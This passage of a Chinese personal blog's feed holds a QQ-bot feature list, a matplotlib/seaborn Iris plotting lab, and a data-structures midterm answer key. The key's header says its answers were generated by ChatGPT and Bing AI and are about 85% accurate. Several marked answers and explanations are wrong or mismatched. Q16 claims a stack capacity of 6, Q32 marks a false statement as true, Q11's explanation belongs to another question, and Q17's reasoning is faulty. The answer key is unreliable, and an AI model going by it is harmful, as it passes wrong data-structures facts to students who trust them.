<li>查看本群软封禁</li>
</ul>
<h3 id="关键词回复"><a href="#关键词回复" class="headerlink" title="关键词回复"></a>关键词回复</h3><blockquote>
<p>关键词回复，当用户发送了关键词时，机器人将会回复指定内容</p>
</blockquote>
<ul>
<li>添加关键词回复</li>
<li>删除关键词回复</li>
<li>查看关键词回复</li>
<li>批量添加关键词回复</li>
</ul>
<h3 id="知识库问答系统"><a href="#知识库问答系统" class="headerlink" title="知识库问答系统"></a>知识库问答系统</h3><blockquote>
<p>知识库问答系统，引入了 jieba 分词和 Levenshtein 距离算法，支持关键词识别，问题识别，可以实现模糊匹配，支持批量添加知识库</p>
<p>数据量越大，匹配结果越准确</p>
</blockquote>
<ul>
<li>开启知识库</li>
<li>关闭知识库</li>
<li>添加知识库</li>
<li>删除知识库</li>
<li>查看知识库</li>
<li>批量添加知识库</li>
</ul>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>编解码系统</p>
<ul>
<li>支持私聊编解码</li>
<li>支持群聊编解码</li>
<li>base64 编解码</li>
<li>MD5 编码</li>
<li>进制转换</li>
<li>hash 计算</li>
<li>密码生成</li>
</ul>
<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><blockquote>
<p>工具系统，提供一些常用的工具功能，主要以接入第三方 API 为主</p>
</blockquote>
<ul>
<li>IP 地址查询</li>
<li>快递查询</li>
</ul>
<h3 id="曲阜师范大学网站监控"><a href="#曲阜师范大学网站监控" class="headerlink" title="曲阜师范大学网站监控"></a>曲阜师范大学网站监控</h3><blockquote>
<p>曲阜师范大学网站监控，每五分钟检查一次，当教务处和资产处网站有更新时，会通知到开启的群聊</p>
</blockquote>
<ul>
<li>教务处监控</li>
<li>资产处监控</li>
</ul>
]]></content>
      <categories>
        <category>数据挖掘</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>数据挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>数据挖掘实验2——数据可视化</title>
    <url>/posts/3110e11b.html</url>
    <content><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol>
<li>学习使用 Python 中的 Matplotlib 包进行数据可视化。</li>
</ol>
<h2 id="实验仪器与设备"><a href="#实验仪器与设备" class="headerlink" title="实验仪器与设备"></a>实验仪器与设备</h2><ol>
<li>计算机 1 台</li>
<li>配置好的 python 环境</li>
</ol>
<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><ol>
<li>根据实验文献，以车辆燃油消耗数据集为基础，进行数据可视化学习。</li>
<li>基于 Iris 数据集进行可视化分析练习。根据所学知识从多角度用不同的图表进行可视化。</li>
</ol>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li>学习教师所给的资料。</li>
<li>编程实现实验内容。</li>
</ol>
<h2 id="提交要求"><a href="#提交要求" class="headerlink" title="提交要求"></a>提交要求</h2><ol>
<li>按照学院的实验报告模板，撰写实验报告，实验报告格式见最下方，命名规则：学号-姓名-实验二-数据挖掘实验报告。</li>
<li>附上实验代码，导出为.py 的文件上传。</li>
<li>实验发布及提交平台：知心教管平台。</li>
</ol>
<h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载数据</span></span><br><span class="line">data = pd.read_csv(<span class="string">&quot;iris/iris.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个图形框架，设置大小</span></span><br><span class="line">plt.figure(figsize=(<span class="number">20</span>, <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图1: 条形图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">sns.barplot(x=<span class="string">&quot;Species&quot;</span>, y=<span class="string">&quot;Sepal.Length&quot;</span>, data=data)</span><br><span class="line">plt.title(<span class="string">&quot;Sepal Length by Species&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图2: 饼图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line">data[<span class="string">&quot;Species&quot;</span>].value_counts().plot.pie(autopct=<span class="string">&quot;%1.1f%%&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Species Distribution&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;&quot;</span>)  <span class="comment"># 移除y标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图3: 直方图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">sns.histplot(data[<span class="string">&quot;Sepal.Length&quot;</span>], kde=<span class="literal">False</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Sepal Length Histogram&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图4: 核密度图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">sns.kdeplot(data[<span class="string">&quot;Sepal.Length&quot;</span>], shade=<span class="literal">True</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Sepal Length KDE&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图5: 箱形图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">sns.boxplot(x=<span class="string">&quot;Species&quot;</span>, y=<span class="string">&quot;Sepal.Length&quot;</span>, data=data)</span><br><span class="line">plt.title(<span class="string">&quot;Sepal Length Boxplot by Species&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图6: 散点图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>)</span><br><span class="line">sns.scatterplot(x=<span class="string">&quot;Sepal.Length&quot;</span>, y=<span class="string">&quot;Sepal.Width&quot;</span>, hue=<span class="string">&quot;Species&quot;</span>, data=data)</span><br><span class="line">plt.title(<span class="string">&quot;Sepal Length vs Sepal Width&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子图7: 折线图</span></span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">sns.lineplot(x=<span class="string">&quot;Petal.Length&quot;</span>, y=<span class="string">&quot;Petal.Width&quot;</span>, hue=<span class="string">&quot;Species&quot;</span>, data=data)</span><br><span class="line">plt.title(<span class="string">&quot;Petal Length vs Petal Width&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调整子图间距</span></span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>数据结构期中考试wp</title>
    <url>/posts/c0eaf0d7.html</url>
    <content><![CDATA[<blockquote>
<p>以下内容全部来自ChatGPT和Microsoft bing ai解答，正确率为85%左右，<font color='red'>仅参考，本人对本页答案概不负责</font></p>
</blockquote>
<h1 id="一、选择题"><a href="#一、选择题" class="headerlink" title="一、选择题"></a>一、选择题</h1><ol>
<li>对于数据结构的描述，下列说法中不正确的是( )。</li>
</ol>
<p><font color='red'>相同的逻辑结构对应的存储结构也必相同</font></p>
<p>数据结构由逻辑结构、存储结构和基本操作三方面组成</p>
<p>对数据结构基本操作的实现与存储结构有关</p>
<p>数据的存储结构是数据的逻辑结构的机内实现</p>
<blockquote>
<p>选项 <em>A</em> 是不正确的。相同的逻辑结构并不意味着存储结构也必须相同。逻辑结构是数据对象之间的抽象关系，而存储结构是这些关系在计算机内部的具体表示。例如，线性表的逻辑结构可以通过数组（顺序存储结构）或链表（链式存储结构）来实现，这两种存储结构有着不同的特性和操作复杂性。因此，即使逻辑结构相同，存储结构也可以不同。其他选项 <em>B</em>、<em>C</em> 和 <em>D</em> 都是正确的。数据结构确实由逻辑结构、存储结构和基本操作三方面组成（<em>B</em>），对数据结构基本操作的实现确实与存储结构有关（<em>C</em>），数据的存储结构是数据的逻辑结构的机内实现（<em>D</em>）。</p>
</blockquote>
<ol start="2">
<li>顺序存储结构中数据元素之间的逻辑关系是由（ ）表示的。</li>
</ol>
<p>线性结构</p>
<p>非线性结构</p>
<p><font color='red'>存储位置</font></p>
<p>指针</p>
<blockquote>
<p>在顺序存储结构中，数据元素之间的逻辑关系是由<strong>存储位置</strong>表示的。所以正确答案是选项 <em>C</em>。在顺序存储结构中，元素之间的逻辑关系（例如线性关系）通过它们在内存中的物理位置来表示。相邻的元素在内存中也是相邻的。这与链式存储结构不同，在链式存储结构中，元素之间的逻辑关系是通过指针表示的。选项 <em>A</em> 和 <em>B</em> 描述的是数据结构的类型，而不是数据元素之间的逻辑关系如何表示。选项 <em>D</em> 是链式存储结构中数据元素之间逻辑关系的表示方式，而不是顺序存储结构。</p>
</blockquote>
<ol start="3">
<li>链接存储结构中数据元素之间的逻辑关系是由( )表示的。</li>
</ol>
<p>线性结构</p>
<p>非线性结构</p>
<p>存储位置</p>
<p><font color='red'>指针</font></p>
<blockquote>
<p>在链接存储结构中，数据元素之间的逻辑关系是由指针表示的。指针指向了下一个数据元素的位置，从而建立了数据元素之间的联系。</p>
<p>因此，选项 D 是正确的。</p>
</blockquote>
<ol start="4">
<li>算法指的是( )。</li>
</ol>
<p><font color='red'>对特定问题求解步骤的一种描述,是指令的有限序列</font></p>
<p>计算机程序</p>
<p>解决问题的计算方法</p>
<p>数据处理</p>
<blockquote>
<p>算法指的是对特定问题求解步骤的一种描述，是指令的有限序列。它是解决问题或执行任务的明确指令集合，旨在通过一系列定义明确的步骤来完成特定任务。算法通常是一系列可执行的操作，能够从初始状态转移到所需的最终状态。</p>
<p>因此，选项 A 是正确的。</p>
</blockquote>
<ol start="5">
<li>假设时间复杂度为O（n^2）的算法在有200个元素的数组上运行需要3.1 ms，则有400个元素的数组上运行需要(   )ms。</li>
</ol>
<p>3.1</p>
<p>6.2</p>
<p><font color='red'>12.4</font></p>
<p>9.61</p>
<blockquote>
<p>根据时间复杂度为 O(n^2) 的算法特点，当数组元素的数量增加一倍时，运行时间将增加为原来的平方倍。因此，200 个元素变为 400 个元素，相当于增加了一倍。根据这个关系，我们可以预计运行时间将是原来的 2^2 &#x3D; 4 倍。即 3.1 ms * 4 &#x3D; 12.4 ms。</p>
<p>因此，有 400 个元素的数组上运行时间将是 12.4 ms。选项 C 中的 12.4 是正确的。</p>
</blockquote>
<ol start="6">
<li>算法分析的两个主要方面是( )。</li>
</ol>
<p><font color='red'>空间性能和时间性能</font></p>
<p>正确性和简明性</p>
<p>可读性和文档性</p>
<p>数据复杂性和程序复杂性</p>
<blockquote>
<p>算法分析的两个主要方面是空间性能和时间性能。在算法设计和评估过程中，我们通常关注算法所需的内存空间以及它执行所需的时间。这些指标可以帮助我们评估算法的效率和可行性，从而选择最适合特定问题的算法。</p>
<p>因此，选项 A 是正确的。</p>
</blockquote>
<ol start="7">
<li>下面( )不是算法所必须具备的特性。</li>
</ol>
<p>有穷性</p>
<p>确切性</p>
<p><font color='red'>高效性</font></p>
<p>可行性</p>
<blockquote>
<p>从定义上讲，算法必须具备“有穷性”、“确切性”和“可行性”，因为算法必须是能够在有限步骤内完成的、每个步骤都必须确切且无歧义，并且必须是可行实施的。因此，这些特性是算法的基本要求。</p>
<p>然而，“高效性”并非是算法必须具备的特性。尽管我们通常希望算法是高效的，但并非所有算法都需要是最高效的。因此，选项 C 中的“高效性”是不是算法所必须具备的特性。</p>
</blockquote>
<ol start="8">
<li>链表不具有的特点是( )。</li>
</ol>
<p><font color='red'>可随机访问任一元素</font></p>
<p>插入删除不需要移动元素</p>
<p>不必事先估计存储空间</p>
<p>所需空间与线性表长度成正比</p>
<blockquote>
<p>链表不具备的特点是可随机访问任一元素。链表中的元素并非按照其在内存中的物理位置顺序存储，因此不能像数组那样通过下标直接访问特定位置的元素。如果要访问链表中的某个特定元素，需要从头节点开始遍历链表直到找到该元素。</p>
<p>因此，选项 A 中的“可随机访问任一元素”是链表不具备的特点。</p>
</blockquote>
<ol start="9">
<li>线性表采用链接存储时，其地址( )。</li>
</ol>
<p>必须是连续的</p>
<p>部分地址必须是连续的</p>
<p>一定是不连续的</p>
<p><font color='red'>连续与否均可以</font></p>
<blockquote>
<p>线性表采用链接存储时，其地址可以是不连续的。在链接存储结构中，元素之间并不要求在物理内存中是连续存储的，相邻元素之间通过指针进行连接。这使得链表结构能够动态地分配和释放内存，避免了因为插入或删除操作导致的大量数据移动。</p>
<p>因此，选项 D 中的“连续与否均可以”是正确的。</p>
</blockquote>
<p>10.循环单链表的主要优点是( )。</p>
<p>不再需要头指针了</p>
<p>从表中任一结点出发都能扫描到整个链表</p>
<p>已知某个结点的位置后,能够容易找到它的直接前趋</p>
<p><font color='red'>在进行插入、删除操作时，能更好地保证链表不断开</font></p>
<blockquote>
<p>循环单链表的主要优点是在进行插入、删除操作时，能更好地保证链表不断开。循环单链表的尾节点指向头节点，形成一个闭环，这使得在进行插入和删除操作时更加方便，因为不需要处理头尾节点的特殊情况。</p>
<p>因此，选项 D 中的“在进行插入、删除操作时，能更好地保证链表不断开”是循环单链表的主要优点。</p>
</blockquote>
<p>11.若线性表中最常用的操作是在最后一个结点之后插入一个节点和删除最后一个结点，则采用( )存储方法最节省时间。</p>
<p>单链表</p>
<p><font color='red'>循环双链表</font></p>
<p>单循环链表</p>
<p>带尾指针的单循环链表</p>
<blockquote>
<p>循环单链表的主要优点是<strong>从表中任一结点出发都能扫描到整个链表</strong>。所以，正确答案是选项 <em>B</em>。在循环单链表中，最后一个元素的指针字段指向链表的第一个元素，形成一个闭环。这意味着我们可以从任何一个元素开始，通过顺序访问每个元素的指针字段，遍历整个链表。然而，循环单链表仍然需要头指针来标识链表的起始位置（选项 <em>A</em> 是错误的）。已知某个结点的位置后，找到它的直接前趋在单链表（包括循环单链表）中并不容易，因为我们只能从头开始遍历链表（选项 <em>C</em> 是错误的）。在进行插入、删除操作时，无论是单链表还是循环单链表，我们都需要确保操作后链表不会断开（选项 <em>D</em> 是错误的）。</p>
</blockquote>
<p>12.从栈顶指针为top的链栈中删除一个结点 ,用x保存被删除结点的值，则执行( )。</p>
<p>x&#x3D;top; top&#x3D;top-&gt; next;</p>
<p>x&#x3D;top-&gt; data;</p>
<p>top&#x3D;top-&gt; next; x&#x3D; top-&gt; data;</p>
<p><font color='red'>x&#x3D;top-&gt; data; top&#x3D; top-&gt; next;</font></p>
<blockquote>
<p>在从栈顶指针为top的链栈中删除一个节点时，我们首先需要保存被删除节点的值，然后更新栈顶指针。栈顶指针需要指向被删除节点的下一个节点，因为栈是先进后出的数据结构，所以删除的是栈顶元素。</p>
<p>因此，正确的操作是:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x = top-&gt;data; // 保存被删除节点的值</span><br><span class="line">top = top-&gt;next; // 更新栈顶指针</span><br></pre></td></tr></table></figure></div>

<p>所以选项是D。</p>
</blockquote>
<p>13.设计一个判别表达式中左右扩号是否配对的算法,采用( )数据结构最佳。</p>
<p>顺序表</p>
<p><font color='red'>栈</font></p>
<p>队列</p>
<p>链表</p>
<blockquote>
<p>对于判别表达式中左右括号是否配对的算法，最适合使用的数据结构是栈。栈是一种后进先出（LIFO）的数据结构，可以用来检查括号是否匹配。具体的算法可以使用栈来存储左括号，并在遇到右括号时弹出相应的左括号进行匹配。</p>
<p>因此，选项 B 中的栈是最佳的数据结构。</p>
</blockquote>
<p>14.将数组称为随机存取结构是因为（ ）。</p>
<p>数组元素是随机的</p>
<p><font color='red'>对数组任意元素的存取时间是相等的</font></p>
<p>随时可以对数组进行访问</p>
<p>数组的存储结构是不定的</p>
<blockquote>
<p>将数组称为随机存取结构是因为对数组任意元素的存取时间是相等的。这是因为数组在内存中是连续存储的，每个元素都可以通过偏移量直接计算出其地址，因此可以在 O(1) 的时间复杂度内访问任意索引处的元素。</p>
<p>因此，选项 B 中的“对数组任意元素的存取时间是相等的”是描述数组作为随机存取结构的原因。</p>
</blockquote>
<p>15.设有两个字符串p和q，求p在q中首次出现的位置的运算称作（ ）。</p>
<p>连接</p>
<p><font color='red'>模式匹配</font></p>
<p>求字串</p>
<p>求串长</p>
<blockquote>
<p>求p在q中首次出现的位置的运算称为模式匹配。模式匹配是计算机科学中的一个重要概念，用于确定一个字符串是否包含另一个字符串作为子字符串，并返回其出现的位置。在这种情况下，给定字符串p和q，我们试图找到q中第一次出现p的位置。</p>
<p>因此，选项 B 中的“模式匹配”是描述这种运算的术语。</p>
</blockquote>
<p>16.设栈S和队列Q的初始状态为空，元素e1，e2，e3，e4，e5，e6依次通过栈S，一个元素出栈后即进入队列Q。若6个元素出队列的顺序是e2，e4，e3，e6，e5，e1，则栈S的容量至少应该是( )。</p>
<p><font color='red'>6</font></p>
<p>4</p>
<p>3</p>
<p>2</p>
<blockquote>
<p>根据题意，元素首先通过栈 S，然后一个一个地出栈并进入队列 Q。最后出队列的元素顺序是 e2，e4，e3，e6，e5，e1。这意味着栈 S 中的元素在被进入队列 Q 之前必须按照逆序排列。</p>
<p>因此，栈 S 的最小容量应至少是 6，因为栈 S 需要依次容纳 e1，e5，e6，e3，e4，e2 这 6 个元素。</p>
<p>因此，选项 A 中的 6 是正确的。</p>
</blockquote>
<p>17.一个栈的入栈序列是1，2，3，4，5，则栈的不可能的输出序列是( )。</p>
<p>54321</p>
<p>45321</p>
<p><font color='red'>43512</font></p>
<p>12345</p>
<blockquote>
<p>对于给定的入栈序列1，2，3，4，5，栈的不可能的输出序列是 43512。这是因为在一个栈中，要取出一个元素，需要将位于栈顶的元素弹出，然后才能取出下一个元素。因此，输出序列中的第一个数字应该是栈中元素的最底部元素，然后逐渐依次向上取出。所以，顺序 4、3、5、1、2 不可能是给定入栈序列的输出序列。</p>
<p>其他选项中的序列都是可能的栈输出序列，但 43512 不是。</p>
</blockquote>
<ol start="18">
<li>栈和队的主要区别在于（ ）。</li>
</ol>
<p>它们的逻辑结构不同</p>
<p>它们的存储结构不同</p>
<p>所包含的运算不同</p>
<p><font color='red'>插入、删除运算的限定不一样</font></p>
<blockquote>
<p>栈和队列的主要区别在于它们的插入和删除运算的限定不同。栈是一种后进先出（LIFO）的数据结构，只允许在一端进行插入和删除操作，而队列是一种先进先出（FIFO）的数据结构，只允许在一端插入，在另一端删除。</p>
<p>因此，选项 D 中的“插入、删除运算的限定不一样”是栈和队列的主要区别。</p>
</blockquote>
<ol start="19">
<li>设模式T&#x3D;“abcabc”，则该模式的next值为( )。</li>
</ol>
<p>{-1，0，0，1，2，3}</p>
<p><font color='red'>{-1，0，0，0，1，2}</font></p>
<p>{-1，0，0，1，1，2}</p>
<p>{1，0，0，0，2，3}</p>
<blockquote>
<p>自己算算就行了，这题原本错了</p>
</blockquote>
<ol start="20">
<li>若一个栈的输入序列是1，2，3，… ,n,输出序列的第一个元素是n，则第 i个输出元素是( )。</li>
</ol>
<p>不确定</p>
<p>n-i</p>
<p>n-i-1</p>
<p><font color='red'>n-i+1</font></p>
<blockquote>
<p>对于一个栈的输入序列是1，2，3，…，n，输出序列的第一个元素是n，则第 i 个输出元素是 n-i+1。这是因为栈是一种后进先出（LIFO）的数据结构，所以最后一个进入栈的元素会最先被弹出，倒数第二个进入栈的元素会第二个被弹出，以此类推。</p>
<p>因此，选项 D 中的 n-i+1 是第 i 个输出元素的正确表示。</p>
</blockquote>
<p>21.设线性表有n个元素，以下操作中,( )在顺序表上实现比在单链表上实现的效率更高。</p>
<p><font color='red'>输出第i(1≤i≤n)个元素值</font></p>
<p>交换第1个和第2个元素的值</p>
<p>顺序输出所有n个元素</p>
<p>查找与给定值x相等的元素在线性表中的序号</p>
<blockquote>
<p>在顺序表和单链表上实现的效率比较如下：</p>
<ul>
<li><strong>输出第i(1≤i≤n)个元素值</strong>：在顺序表上实现的效率更高。因为顺序表可以直接通过索引访问任何位置的元素，时间复杂度为O(1)。而在单链表中，我们需要从头开始遍历到第i个元素，时间复杂度为O(n)。</li>
<li><strong>交换第1个和第2个元素的值</strong>：在单链表上实现的效率更高。因为在单链表中，我们可以直接改变节点的链接，而不需要移动元素本身。而在顺序表中，我们需要移动元素本身，这可能涉及到大量的数据复制。</li>
<li><strong>顺序输出所有n个元素</strong>：在顺序表和单链表上实现的效率相同。因为无论是顺序表还是单链表，我们都需要遍历所有的元素，时间复杂度都是O(n)。</li>
<li><strong>查找与给定值x相等的元素在线性表中的序号</strong>：在顺序表和单链表上实现的效率相同。因为无论是顺序表还是单链表，我们都需要遍历所有的元素来查找给定值，时间复杂度都是O(n)。</li>
</ul>
<p>所以，在这些操作中，只有<strong>输出第i(1≤i≤n)个元素值</strong>这个操作在顺序表上实现比在单链表上实现的效率更高。</p>
</blockquote>
<p>22.对于n个元素组成的线性表,建立一个有序单链表的时间复杂度是( )。</p>
<blockquote>
<p>建立一个有序单链表的时间复杂度是<font color='red'>O(n^2)。</font></p>
<p>在一个有序单链表中插入一个元素需要在链表中找到合适的位置，这可能需要从头开始遍历链表，直到找到合适的位置为止。插入一个元素的平均时间复杂度为O(n)。如果要建立一个有序单链表，需要将n个元素一个个插入，因此总的时间复杂度为O(n) * O(n) &#x3D; O(n^2)。</p>
</blockquote>
<p>23.设数组S[n]作为两个栈S1和S2的存储空间，对任何一个栈只有当S[n]全满时才不能进行进栈操作。为这两个栈分配空间的最佳方案是( )。</p>
<p><font color='red'>S1的栈底位置为0,S2的栈底位置为n-1</font></p>
<p>S1的栈底位置为0,S2的栈底位置为n&#x2F;2</p>
<p>S1的栈底位置为0,S2的栈底位置为n</p>
<p>S1的栈底位置为0,S2的栈底位置为1</p>
<blockquote>
<p>为了最大限度地利用存储空间，我们应该将S1的栈底位置设置为0，将S2的栈底位置设置为n-1。这样可以使两个栈的空间分配在整个数组的两端，最大化利用数组的空间。所以最佳方案是：</p>
<p>S1的栈底位置为0，S2的栈底位置为n-1。</p>
</blockquote>
<p>24.一个队列的入队顺序是1、2、3和4,则队列的输出顺序是( )。</p>
<p>4321</p>
<p><font color='red'>1234</font></p>
<p>1432</p>
<p>3241</p>
<blockquote>
<p>一个队列的特点是先进先出(FIFO)，即最先进入队列的元素最先出队列。根据题目给出的入队顺序，元素1首先进入队列，然后是2、3、4。因此，出队顺序应为1234。</p>
<p>所以，队列的输出顺序是1234。</p>
</blockquote>
<p>25.对特殊矩阵采用压缩存储的目的主要是为了( )。</p>
<p>表达变得简单</p>
<p>对矩阵元素的存取变得简单</p>
<p>去掉矩阵中的多余元素</p>
<p><font color='red'>减少不必要的存储空间</font></p>
<blockquote>
<p>对特殊矩阵采用压缩存储的主要目的是为了<strong>减少不必要的存储空间</strong>。通过识别和利用矩阵中的特殊结构或特殊规律，可以使用更少的存储空间来表示矩阵，从而减少存储开销。这样可以节省存储空间，并降低存储和传输成本。</p>
</blockquote>
<p>26.在解决计算机主机与打印机之间速度不匹配问题时通常设置一个打印缓冲区，该缓冲区应该是一个( )结构。</p>
<p>栈</p>
<p><font color='red'>队列</font></p>
<p>数组</p>
<p>线性表</p>
<blockquote>
<p>在解决计算机主机与打印机之间速度不匹配问题时，通常设置一个打印缓冲区，该缓冲区应该是一个队列结构。</p>
<p>使用队列结构可以保证打印作业按照先来先服务的原则进行处理。当打印机的处理速度慢于计算机主机的传输速度时，打印缓冲区可以暂时存储待打印的作业，然后按照顺序逐一传输到打印机进行打印。</p>
</blockquote>
<p>27.若某线性表中最常用的操作是取第i个元素和找第i个元素的前驱，则采用（ ）存储方法最节省时间。</p>
<p><font color='red'>顺序表</font></p>
<p>单链表</p>
<p>双链表</p>
<p>单循环链表</p>
<blockquote>
<p>若某线性表中最常用的操作是取第 i 个元素和找第 i 个元素的前驱，采用<strong>顺序表</strong>存储方法最节省时间。顺序表可以通过下标直接访问元素，时间复杂度为 O(1)，而单链表、双链表以及单循环链表在取第 i 个元素的操作中需要遍历至第 i 个节点，时间复杂度为 O(i)。因此，在此情况下，采用顺序表存储方法可以最节省时间。</p>
</blockquote>
<ol start="28">
<li>在一个单链表中，已知q所指结点是p所指结点的直接前驱，若在q和p之间插入s所指结点，则执行( )操作。</li>
</ol>
<p>s-&gt;next&#x3D;p-&gt;next; p-&gt; next&#x3D;s;</p>
<p><font color='red'>q-&gt;next&#x3D;s; s-&gt;next&#x3D;p;</font></p>
<p>p-&gt;next&#x3D;s-&gt;next; s-&gt;next&#x3D;p;</p>
<p>p-&gt;next&#x3D;s; s-&gt;next&#x3D;q;</p>
<blockquote>
<p>在一个单链表中，已知 q 所指结点是 p 所指结点的直接前驱，若在 q 和 p 之间插入 s 所指结点，应执行以下操作：</p>
<p>q-&gt;next&#x3D;s; s-&gt;next&#x3D;p;</p>
<p>这样可以将 s 插入到 q 和 p 之间，完成链表的插入操作。</p>
</blockquote>
<p>29.关于矩阵压缩存储，下面的说法中，不正确的是( )。</p>
<p>对称矩阵只需存放包括主对角线元素在内的下(或上)三角的元素即可</p>
<p>对角矩阵只需存放非零元素即可</p>
<p>稀疏矩阵中值为零的元素较多，因此可以采用三元组表方法存储</p>
<p><font color='red'>稀疏矩阵中大量值为零的元素分布有规律，因此可以采用三元组表方法存储</font></p>
<blockquote>
<p>关于矩阵压缩存储，不正确的说法是：</p>
<p>稀疏矩阵中大量值为零的元素分布有规律，因此可以采用三元组表方法存储。</p>
<p>虽然稀疏矩阵中大量值为零的元素可以采用三元组表方法存储，但并不一定有规律。使用三元组表方法存储的目的是为了有效地表示稀疏矩阵，并且避免存储大量无效的零元素，而不是基于元素分布的规律。</p>
</blockquote>
<p>30.关于数组，下面的说法中，不正确的是( )。</p>
<p>数组是一种线性结构</p>
<p>数组是一种定长的线性结构</p>
<p>除了插入与删除操作外，数组的基本操作还有存取、修改、检索和排序等</p>
<p><font color='red'>数组的基本操作有存取、修改、检索和排序等，没有插入与删除操作</font></p>
<blockquote>
<p>关于数组，不正确的说法是：</p>
<p>数组的基本操作有存取、修改、检索和排序等，没有插入与删除操作。</p>
<p>实际上，数组是一种定长的线性结构，长度在创建时被固定。在插入和删除元素时，需要移动其他元素以保持数组的连续性，这会导致较高的时间复杂度。因此，数组的插入和删除操作相对效率较低。</p>
</blockquote>
<h1 id="二、判断题"><a href="#二、判断题" class="headerlink" title="二、判断题"></a>二、判断题</h1><p>31.稀疏矩阵压缩存储后，必会失去随机存取功能。</p>
<p>正确</p>
<p><font color='red'>错误</font></p>
<blockquote>
<p>稀疏矩阵压缩存储后，并不一定会失去随机存取功能。虽然压缩存储可能会限制某些随机存取功能，但这取决于具体的压缩算法和数据结构。例如，使用三元组表等压缩方式仍然可以支持随机存取功能，只是在稀疏矩阵中的零元素可能不会占据存储空间。因此，这个说法是不正确的。</p>
</blockquote>
<p>32.将数组称为随机存取结构是因为随时可以对数组进行存取访问。</p>
<p><font color='red'>正确</font></p>
<p>错误</p>
<blockquote>
<p>将数组称为随机存取结构是因为可以通过下标直接随机访问数组中的元素，因此说法是正确的。数组允许按照元素的索引进行快速访问，这意味着可以通过指定元素的索引位置来直接访问或修改元素的值。这种随机访问的特性使得数组成为一种支持高效随机访问的数据结构。</p>
</blockquote>
<p>33.有n个元素依次进栈，则出栈序列有(n-1)&#x2F;2种。</p>
<p>正确</p>
<p><font color='red'>错误</font></p>
<blockquote>
<p>这个说法是错误的。出栈序列的数量不一定是 (n-1)&#x2F;2。实际上，对于给定的n个元素，有许多不同的出栈序列可能。出栈序列的数量取决于具体的排列组合情况，而不是简单地等于 (n-1)&#x2F;2。具体的出栈序列数量需要根据出栈顺序的特定限制条件进行计算。</p>
</blockquote>
<p>34.栈可以作为实现过程调用的一种数据结构。</p>
<p><font color='red'>正确</font></p>
<p>错误</p>
<blockquote>
<p>栈可以作为实现过程调用的一种数据结构，因此这个说法是正确的。在程序执行过程中，当一个过程调用另一个过程时，会将返回地址、参数和局部变量等信息存储在栈中。这些信息以堆栈的形式保存，即后调用的函数压栈，先调用的函数出栈。栈的特点使得它非常适合用于实现过程调用和递归等计算机程序中。</p>
</blockquote>
<p>35.在栈满的情况下不能做进栈操作，否则将产生“上溢”。</p>
<p><font color='red'>正确</font></p>
<p>错误</p>
<blockquote>
<p>在栈满的情况下进行进栈操作将导致栈上溢，这会导致数据丢失或程序异常终止。因此，这个说法是正确的。栈有一个容量限制，当栈已满时，无法再进行进栈操作。如果强行进行进栈操作，将导致栈上溢（stack overflow），可能会损坏其他数据或引发程序异常。因此，在实现栈时，通常需要考虑栈上溢的情况并进行相应的处理。</p>
</blockquote>
<p>36.在循环队列中，front指向队头元素的前一个位置rear指向队尾元素的位置，则队满的条件是front&#x3D;rear。</p>
<p>正确</p>
<p><font color='red'>错误</font></p>
<blockquote>
<p>在循环队列中，通常采用取模运算来实现循环。front 指向队头元素的位置，rear 指向队尾元素的下一个位置。因此，队满的条件是 <code>(rear + 1) % n == front</code>，其中 <code>n</code> 是队列的最大容量。</p>
<p>因此，说法是错误的。队满的条件不是 <code>front = rear</code>，而是 <code>(rear + 1) % n == front</code>。</p>
</blockquote>
<p>37.在单链表中，要取得某个元素，只要知道该元素所在结点的地址即可，因此单链表是随机存取结构。</p>
<p>正确</p>
<p><font color='red'>错误</font></p>
<blockquote>
